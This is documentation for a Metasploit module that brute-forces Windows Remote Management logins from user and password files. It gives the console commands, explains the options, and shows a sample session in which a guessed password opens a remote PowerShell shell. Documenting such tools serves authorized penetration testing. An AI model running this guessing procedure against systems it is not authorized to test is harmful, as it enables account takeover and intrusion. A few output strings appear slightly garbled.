## Vulnerable Application

WinRM is the Microsoft implementation of the WS-Management protocol. Among other features, it provides
shell access to other systems. This module performs a brute force of username:password combinations.
Upon success, it creates an interactive command shell.

## Verification Steps

1. Do: ```use auxiliary/scanner/winrm/winrm_login```
1. Do: ```set RHOSTS [IP]```
1. Do: ```set USERNAME [USERNAME]``` or ```set USER_FILE [FILE]```
1. Do: ```set PASSWORD [PASSWORD]``` or ```set PASS_FILE [FILE]```
1. Do: ```run```


## Options

### BLANK_PASSWORD

Boolean value on if an additional login attempt should be attempted with an empty password for every user.

### PASSWORD

Password to try for each user.

### PASS_FILE

A file containing a password on every line. Kali linux example: `/usr/share/wordlists/metasploit/password.lst`

### STOP_ON_SUCCESS

If a valid login is found on a host, immediately stop attempting additional logins on that host.

### USERNAME

Username to try for each password.

### USERPASS_FILE

A file containing a username and password, separated by a space, on every line. An example line would be `username
password`.

### USER_AS_PASS

Boolean value on if an additional login attempt should be attempted with the password as the username.

### USER_FILE

A file containing a username on every line.

### VERBOSE

Show a failed login attempt. This can get rather verbose when large `USER_FILE`s or `PASS_FILE`s are used. A failed
attempt will look similar to the following:

```
[-] 192.168.1.20: - LOGIN FAILED: WORKSTATION\test:test (Incorrect: )
```

## Option Combinations

It is important to note that usernames and passwords can be entered in multiple combinations. For instance, a password
could be set in `PASSWORD`, be part of either `PASS_FILE` or `USERPASS_FILE`, be guessed via `USER_AS_PASS` or
`BLANK_PASSWORDS`. This module makes a combination of all of the above when attempting logins. So if a password is set
in `PASSWORD`, and a `PASS_FILE` is listed, passwords will be generated from BOTH of these.

## Scenarios

```
msf6 > use auxiliary/scanner/winrm/winrm_login
msf6 auxiliary(scanner/winrm/winrm_login) > set user_file ~/users
user_file => ~/users
msf6 auxiliary(scanner/winrm/winrm_login) > set pass_file ~/passes
pass_file => ~/passes
msf6 auxiliary(scanner/winrm/winrm_login) > set rhosts 192.168.1.205
rhosts => 192.168.1.205
msf6 auxiliary(scanner/winrm/winrm_login) > set verbose true
verbose => true
msf6 auxiliary(scanner/winrm/winrm_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 192.168.1.205: - LOGIN FAILED: WORKSTATION\Administrator:hunter2 (Incorrect: )
[-] 192.168.1.205: - LOGIN FAILED: WORKSTATION\Administrator:pass12345 (Incorrect: )
[-] 192.168.1.205: - LOGIN FAILED: WORKSTATION\Administrator:Winte.1.0 (Incorrect: )
[-] 192.168.1.205: - LOGIN FAILED: WORKSTATION\smash:hunter2 (Incorrect: )
[+] 192.168.1.205:5985 - Login Successful: WORKSTATION\smash:pass12345
[*] Command shell session 1 opened (WinRM) at.1.20509-03 13:27:26 +1000
[-] 192.168.1.205: - LOGIN FAILED: WORKSTATION\Guest:hunter2 (Incorrect: )
[-] 192.168.1.205: - LOGIN FAILED: WORKSTATION\Guest:pass12345 (Incorrect: )
[-] 192.168.1.205: - LOGIN FAILED: WORKSTATION\Guest:Winte.1.0 (Incorrect: )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/winrm/winrm_login) > sessions 

Active sessions
===============

  Id  Name  Type           Information                 Connection
  --  ----  ----           -----------                 ----------
  1         shell windows  WinRM : (WIN10DEV\smash)  WinRM (192.168.1.205)

msf6 auxiliary(scanner/winrm/winrm_login) > sessions 1
[*] Starting interaction with 1...

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\smash>
```
